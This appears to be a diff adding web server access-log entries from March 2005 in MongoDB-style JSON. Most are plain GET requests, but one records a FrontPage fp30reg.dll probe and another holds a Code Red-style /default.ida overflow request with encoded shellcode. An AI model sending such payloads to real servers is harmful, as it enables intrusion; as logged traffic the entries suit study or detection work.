+{"host": "218.85.9.143", "date": ISODate("16/Mar/2005:18:23:17Z"), "path": "http://www.intel.com/", "request": "GET http://www.intel.com/ HTTP/1.1", "useragent": "Mozilla/5.0 (compatible; MSIE 5.01; Win2000)"}
+{"host": "218.85.9.143", "date": ISODate("16/Mar/2005:18:23:17Z"), "path": "http://www.intel.com/", "request": "GET http://www.intel.com/ HTTP/1.1", "useragent": "Mozilla/5.0 (compatible; MSIE 5.01; Win2000)"}
+{"host": "218.85.9.143", "date": ISODate("16/Mar/2005:18:23:18Z"), "path": "http://www.intel.com/", "request": "GET http://www.intel.com/ HTTP/1.1", "useragent": "Mozilla/5.0 (compatible; MSIE 5.01; Win2000)"}
+{"host": "218.85.9.143", "date": ISODate("16/Mar/2005:18:23:17Z"), "path": "http://www.intel.com/", "request": "GET http://www.intel.com/ HTTP/1.1", "useragent": "Mozilla/5.0 (compatible; MSIE 5.01; Win2000)"}
+{"host": "218.85.9.143", "date": ISODate("16/Mar/2005:18:23:18Z"), "path": "http://www.intel.com/", "request": "GET http://www.intel.com/ HTTP/1.1", "useragent": "Mozilla/5.0 (compatible; MSIE 5.01; Win2000)"}
+{"host": "218.85.9.143", "date": ISODate("16/Mar/2005:18:23:18Z"), "path": "http://www.intel.com/", "request": "GET http://www.intel.com/ HTTP/1.1", "useragent": "Mozilla/5.0 (compatible; MSIE 5.01; Win2000)"}
+{"host": "218.85.9.143", "date": ISODate("16/Mar/2005:18:23:18Z"), "path": "http://www.intel.com/", "request": "GET http://www.intel.com/ HTTP/1.1", "useragent": "Mozilla/5.0 (compatible; MSIE 5.01; Win2000)"}
+{"host": "218.85.9.143", "date": ISODate("16/Mar/2005:18:23:19Z"), "path": "http://www.intel.com/", "request": "GET http://www.intel.com/ HTTP/1.1", "useragent": "Mozilla/5.0 (compatible; MSIE 5.01; Win2000)"}
+{"host": "218.85.9.143", "date": ISODate("16/Mar/2005:18:23:18Z"), "path": "http://www.intel.com/", "request": "GET http://www.intel.com/ HTTP/1.1", "useragent": "Mozilla/5.0 (compatible; MSIE 5.01; Win2000)"}
+{"host": "218.85.9.143", "date": ISODate("16/Mar/2005:18:23:19Z"), "path": "http://www.intel.com/", "request": "GET http://www.intel.com/ HTTP/1.1", "useragent": "Mozilla/5.0 (compatible; MSIE 5.01; Win2000)"}
+{"host": "218.85.9.143", "date": ISODate("16/Mar/2005:18:23:20Z"), "path": "http://www.intel.com/", "request": "GET http://www.intel.com/ HTTP/1.1", "useragent": "Mozilla/5.0 (compatible; MSIE 5.01; Win2000)"}
+{"host": "218.85.9.143", "date": ISODate("16/Mar/2005:18:23:20Z"), "path": "http://www.intel.com/", "request": "GET http://www.intel.com/ HTTP/1.1", "useragent": "Mozilla/5.0 (compatible; MSIE 5.01; Win2000)"}
+{"host": "218.85.9.143", "date": ISODate("16/Mar/2005:18:23:21Z"), "path": "http://www.intel.com/", "request": "GET http://www.intel.com/ HTTP/1.1", "useragent": "Mozilla/5.0 (compatible; MSIE 5.01; Win2000)"}
+{"host": "218.85.9.143", "date": ISODate("16/Mar/2005:18:23:21Z"), "path": "http://www.intel.com/", "request": "GET http://www.intel.com/ HTTP/1.1", "useragent": "Mozilla/5.0 (compatible; MSIE 5.01; Win2000)"}
+{"host": "218.85.9.143", "date": ISODate("16/Mar/2005:18:23:21Z"), "path": "http://www.intel.com/", "request": "GET http://www.intel.com/ HTTP/1.1", "useragent": "Mozilla/5.0 (compatible; MSIE 5.01; Win2000)"}
+{"host": "67.81.23.243", "date": ISODate("16/Mar/2005:19:08:50Z"), "path": "/", "request": "GET / HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"}
+{"host": "202.122.16.7", "date": ISODate("16/Mar/2005:19:41:55Z"), "path": "/_vti_bin/_vti_aut/fp30reg.dll", "request": "POST /_vti_bin/_vti_aut/fp30reg.dll HTTP/1.1" }
+{"host": "220.170.151.237", "date": ISODate("16/Mar/2005:19:49:21Z"), "path": "/", "request": "GET / HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"}
+{"host": "64.83.24.184", "date": ISODate("16/Mar/2005:20:35:18Z"), "path": "/", "request": "GET / HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"}
+{"host": "222.166.160.138", "date": ISODate("17/Mar/2005:00:08:12Z"), "path": "/", "request": "GET / HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"}
+{"host": "61.10.7.45", "date": ISODate("17/Mar/2005:04:42:15Z"), "path": "/", "request": "GET / HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"}
+{"host": "69.107.121.41", "date": ISODate("17/Mar/2005:05:31:20Z"), "path": "/", "request": "GET / HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"}
+{"host": "201.9.104.83", "date": ISODate("17/Mar/2005:05:43:04Z"), "path": "/default.ida", "request": "GET /default.ida?XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u9090%u8190%u00c3%u0003%u8b00%u531b%u53ff%u0078%u0000%u00=a HTTP/1.0" }
+{"host": "207.10.54.33", "date": ISODate("17/Mar/2005:08:26:36Z"), "path": "/", "request": "GET / HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"}
+{"host": "68.98.176.140", "date": ISODate("17/Mar/2005:09:12:05Z"), "path": "/", "request": "GET / HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"}
+{"host": "68.250.190.161", "date": ISODate("17/Mar/2005:10:06:25Z"), "path": "/", "request": "GET / HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"}
+{"host": "219.150.244.58", "date": ISODate("17/Mar/2005:11:38:27Z"), "path": "/", "request": "GET / HTTP/1.1", "useragent": "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)"}]
